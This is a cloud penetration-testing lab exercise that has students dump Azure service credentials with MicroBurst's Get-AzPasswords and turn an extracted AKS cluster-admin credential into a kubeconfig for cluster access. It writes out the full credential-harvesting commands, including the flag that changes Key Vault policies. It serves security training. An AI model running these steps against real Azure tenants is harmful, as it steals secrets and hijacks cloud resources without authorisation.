### Lab 5A - Credential Hunting
In this hands-on exercise, we will use the MicroBurst function â€“ **`Get-AzPasswords`** to perform an authenticated enumeration of service credentials in an Azure environment.

1. In a PowerShell console on your pentest VM, use the following commands to authenticate to Entra ID (Azure AD) and Azure as the **`Ava`**. Replace the **`USERNAME`** and **`PASSWORD`** placeholders with the real values of Ava's credentials from the **`LABXX-Info`** exercise file.

```
$username = "USERNAME"
$password = "PASSWORD" | ConvertTo-SecureString -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential($username, $password)

Connect-AzAccount -Credential $cred
Connect-AzureAD -Credential $cred
```

2. Import the MicroBurst module into your PowerShell session with the following commands:
* If you receive some error messages about AzureRm, please ignore (AzureRm is deprecated and will be removed in a future release)
```
cd "$env:SystemDrive\PentestTools\Azure\Attack\MicroBurst"
Import-Module .\MicroBurst.psm1
```

3. Run the MicroBurst function to enumerate the service keys that Ava has access to. Some of the calls may fail as Ava does not have access to all of the services.You can ignore these errors.
```
Get-AzPasswords -ExportCerts Y -ExportKube Y -ModifyPolicies Y -Verbose
```

5. Review the results
* **`AppServiceConfig`** type credentials means that you can use these credentals to read and publish code to those services using FTP/WebDeploy/ZipDeploy.
* **`Storage Account`** type credentials means that you can use the keys to read/write data to the storage account.
* **`AKS Cluster Admin`** type credentials means that you can use the credentials to gain access to an AKS cluster.

6. Test to see that there is currently no access to any Kubernetes cluster.
```
# This should fail initially
kubectl get nodes
```

7. Copy everything in the **`AKS Cluster Admin - Value`** field and paste it into a notepad. Copy everything starting from **`apiVersion`** to the end of the **`token`**.
* Also, remode the wide spaces on the left side of the text. You can use CNTRL+H to replace "               " with "". (Let me know if you need assistance). 
* Also remove line breaks for the **`certificate-authority-data`**, **`client-certificate-data`**, **`client-key-data`** and **`token`**.
* Save the file as **File name**: **`kubeconfig.yaml`** and **Save as type**: **`All Files (*.*)`**
* You can validate the file using a tool like [https://www.yamllint.com/](https://www.yamllint.com/)

8. Set the file in the environment path and test access to the cluster again. This should succeed this time.
```
$Env:KUBECONFIG = "$env:SystemDrive\PentestTools\Azure\Attack\MicroBurst\kubeconfig.yaml"

kubectl get nodes
```